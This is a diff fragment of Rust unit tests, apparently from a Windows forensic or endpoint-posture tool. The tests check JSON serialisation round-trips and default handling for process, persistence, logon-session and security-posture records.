+        assert!(j2.contains(r#""signer_source":"catalog""#), "{j2}");
+        let back: ProcessRecord = serde_json::from_str(&j2).unwrap();
+        assert_eq!(back.signer_source, Some(SignerSource::Catalog));
+
+        let old_persist = r#"{"mechanism":"wmi_subscription","location":"x","value":null,"command":null,"binary_path":null,"binary_sha256":null,"signed":null,"signer":null,"last_write":null}"#;
+        let mut r: PersistenceRecord = serde_json::from_str(old_persist).unwrap();
+        assert_eq!(r.bound, None);
+        assert_eq!(r.signer_source, None);
+        assert!(!serde_json::to_string(&r).unwrap().contains("bound"));
+        r.bound = Some(false);
+        r.signer_source = Some(SignerSource::Embedded);
+        let j3 = serde_json::to_string(&r).unwrap();
+        assert!(j3.contains(r#""bound":false"#) && j3.contains(r#""signer_source":"embedded""#));
+
+        let old_logon = r#"{"user":"D\\a","logon_type":"Interactive","logon_time":null,"source":null,"session_id":1}"#;
+        let l: LogonSessionRecord = serde_json::from_str(old_logon).unwrap();
+        assert_eq!(l.session_state, None);
+        assert_eq!(l.logon_server, None);
+        let j4 = serde_json::to_string(&l).unwrap();
+        assert!(!j4.contains("session_state") && !j4.contains("logon_server"));
+    }
+
+    #[test]
+    fn posture_record_kind_tag_round_trips_and_defaults() {
+        let rec = Record::Posture(PostureRecord {
+            audit_process_creation: Some(false),
+            sysmon_present: Some(true),
+            defender_exclusions: vec![DefenderExclusion {
+                kind: ExclusionKind::IpAddress,
+                value: "10.0.0.1".into(),
+                policy: true,
+                key: "k".into(),
+                last_write: None,
+            }],
+            ..PostureRecord::default()
+        });
+        let json = serde_json::to_string(&rec).unwrap();
+        assert!(json.contains(r#""kind":"posture""#), "{json}");
+        assert!(json.contains(r#""kind":"ip_address""#), "{json}");
+        let back: Record = serde_json::from_str(&json).unwrap();
+        assert_eq!(serde_json::to_string(&back).unwrap(), json);
+        // Minimal JSON: only the four core fields are required.
+        let min = r#"{"kind":"posture","audit_process_creation":null,"cmdline_in_4688":true,"ps_scriptblock":null,"sysmon_present":null}"#;
+        let Record::Posture(p) = serde_json::from_str::<Record>(min).unwrap() else {
+            panic!("expected Posture");
+        };
+        assert_eq!(p.cmdline_in_4688, Some(true));
+        assert!(p.task_cache.is_empty() && p.defender_policy == DefenderPolicy::default());
     }
 }
